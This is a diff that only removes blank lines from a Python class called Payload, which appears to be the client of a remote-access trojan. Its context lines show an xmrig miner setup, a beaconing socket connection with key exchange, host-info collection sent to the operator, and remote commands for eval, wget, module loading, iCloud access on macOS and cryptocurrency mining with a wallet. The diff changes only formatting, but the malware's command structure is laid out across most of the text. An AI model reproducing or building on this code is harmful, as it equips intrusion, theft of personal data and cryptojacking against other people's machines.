@@ -1374,16 +1374,13 @@ class Payload():
         self.xmrig_path = None
         self.xmrig_path_dev = None
 
-
     def _get_flags(self):
         return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())
-
 
     def _get_command(self, cmd):
         if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
             return getattr(self, cmd)
         return False
-
 
     def _get_connection(self, host, port):
         while True:
@@ -1401,7 +1398,6 @@ class Payload():
         self.flags.passive.clear()
         return connection
 
-
     def _get_key(self, connection):
         if isinstance(connection, socket.socket):
             if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
@@ -1410,7 +1406,6 @@ class Payload():
                 raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
         else:
             raise TypeError("invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket, type(connection)))
-
 
     def _get_info(self):
         info = {}
@@ -1435,7 +1430,6 @@ class Payload():
         msg = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
         return info
-
 
     @threaded
     def _get_resources(self, target=None, base_url=None):
@@ -1480,7 +1474,6 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self._get_resources.__name__, str(e)))
 
-
     @threaded
     def _get_prompt_handler(self):
         self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
@@ -1494,7 +1487,6 @@ class Payload():
             except Exception as e:
                 log(str(e))
                 break
-
 
     @threaded
     def _get_thread_handler(self):
@@ -1529,7 +1521,6 @@ class Payload():
             return os.getcwd()
         except:
             return "{}: No such file or directory".format(path)
-
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ls <path>')
     def ls(self, path='.'):
@@ -1581,7 +1572,6 @@ class Payload():
         """
         return os.getcwd()
 
-
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='eval <code>')
     def eval(self, code):
         """
@@ -1595,7 +1585,6 @@ class Payload():
             return eval(code)
         except Exception as e:
             return "{} error: {}".format(self.eval.__name__, str(e))
-
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='wget <url>')
     def wget(self, url, filename=None):
@@ -1624,7 +1613,6 @@ class Payload():
                 log("{} error: {}".format(self.wget.__name__, str(e)))
         else:
             return "Invalid target URL - must begin with 'http'"
-
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='kill')
     def kill(self):
@@ -1659,7 +1647,6 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.kill.__name__, str(e)))
 
-
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='help [cmd]')
     def help(self, name=None):
         """
@@ -1681,7 +1668,6 @@ class Payload():
                 log("{} error: {}".format(self.help.__name__, str(e)))
         else:
             return "'{}' is not a valid command and is not a valid module".format(name)
-
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='load <module> [target]')
     def load(self, args):
@@ -1716,7 +1702,6 @@ class Payload():
                     log("{} error: {}".format(self.load.__name__, str(e)))
                     return "{} error: {}".format(self.load.__name__, str(e))
 
-
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
         """
@@ -1734,7 +1719,6 @@ class Payload():
                 return "Job '{}' not found".format(target)
         except Exception as e:
             log("{} error: {}".format(self.stop.__name__, str(e)))
-
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
@@ -1774,7 +1758,6 @@ class Payload():
         except Exception as e:
             log("'{}' error: {}".format(_threads.__name__, str(e)))
 
-
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
     def abort(self, *args):
         """
@@ -1802,7 +1785,6 @@ class Payload():
             taskkill.start()
             sys.exit()
 
-
     @config(platforms=['darwin'], command=True, usage='icloud')
     def icloud(self):
         """
@@ -1813,7 +1795,6 @@ class Payload():
             self.load('icloud')
         return globals()['icloud'].run()
 
-
     @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [port] [wallet]')
     def miner(self, args):
         """
@@ -1822,8 +1803,6 @@ class Payload():
         `Required`
         :param str url:         mining server url
         :param str username:    username for mining server
-
-
         """
         args = str(args).split()
 
